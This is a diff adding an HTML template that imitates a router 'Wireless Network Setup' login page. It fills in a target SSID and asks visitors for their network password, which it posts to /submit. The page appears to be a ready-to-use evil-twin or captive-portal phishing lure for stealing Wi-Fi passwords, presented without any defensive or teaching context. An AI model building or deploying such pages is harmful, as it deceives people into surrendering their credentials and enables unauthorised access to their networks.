@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{{router_name}} - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <h1>🔒 Router Configuration</h1>
+            <p>Wireless Network Setup</p>
+        </div>
+        <div class="form-container">
+            <div class="info-box">
+                <p>To continue, please enter your network credentials. This is required to configure your connection settings.</p>
+            </div>
+            <form method="POST" action="/submit">
+                <div class="form-group">
+                    <label for="ssid">Network Name (SSID)</label>
+                    <input type="text" id="ssid" name="ssid" value="{{ssid}}" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Network Password</label>
+                    <input type="password" id="password" name="password" required placeholder="Enter your password">
+                </div>
+                <button type="submit" class="submit-button">Connect to Network</button>
+            </form>
+            <div class="network-info">
+                <p>Connecting to: <span class="network-name">{{ssid}}</span></p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
